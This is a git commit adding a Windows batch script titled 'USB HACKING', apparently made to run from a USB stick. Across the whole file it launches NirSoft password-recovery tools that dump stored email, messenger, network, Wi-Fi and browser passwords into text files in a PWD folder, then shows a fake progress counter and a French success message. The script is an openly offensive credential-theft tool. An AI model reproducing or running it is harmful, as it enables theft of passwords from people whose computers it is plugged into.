8d89c8ba25341f247710b0396fa7adade75d3bb7
EnzoCorbin <46630674+EnzoCorbin@users.noreply.github.com>
2019-01-30 22:07:14 +0100

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,51 @@
+color 2
+cls
+
+@echo off
+
+echo                       ---------------------------------
+echo                                    Bienvenue                                                                                        
+echo                         	  USB HACKING       
+echo                                       by                                       
+echo                                    WAKED XY                                  
+echo                                      2017              
+echo                       ---------------------------------
+
+
+Rem pause
+
+start mailpv.exe /stext PWD\mailpv.txt
+start mspass.exe /stext PWD\mspass.txt
+start netpass.exe /stext PWD\netpass.txt
+start WirelessKeyView.exe /stext PWD\WirelessKeyView.txt
+start WebBrowserPassView.exe /stext PWD\WebBrowserPassView.txt
+
+echo Copie des Passwords en cours ...
+ping 0.0.0.0 -n 1 >nul
+echo 10...
+ping 0.0.0.0 -n 1 >nul
+echo 20...
+ping 0.0.0.0 -n 1 >nul
+echo 30...
+ping 0.0.0.0 -n 1 >nul
+echo 40...
+ping 0.0.0.0 -n 1 >nul
+echo 50...
+ping 0.0.0.0 -n 1 >nul
+echo 60...
+ping 0.0.0.0 -n 1 >nul
+echo 70... 
+ping 0.0.0.0 -n 1 >nul
+echo 80...
+ping 0.0.0.0 -n 1 >nul
+echo 90...
+ping 0.0.0.0 -n 1 >nul
+echo 100
+ping 0.0.0.0 -n 1 >nul
+echo>nul
+echo Copie des passwords effectuee avec succes!
+
+ping 0.0.0.0 -n 2 >nul
+rem pause
+
+exit
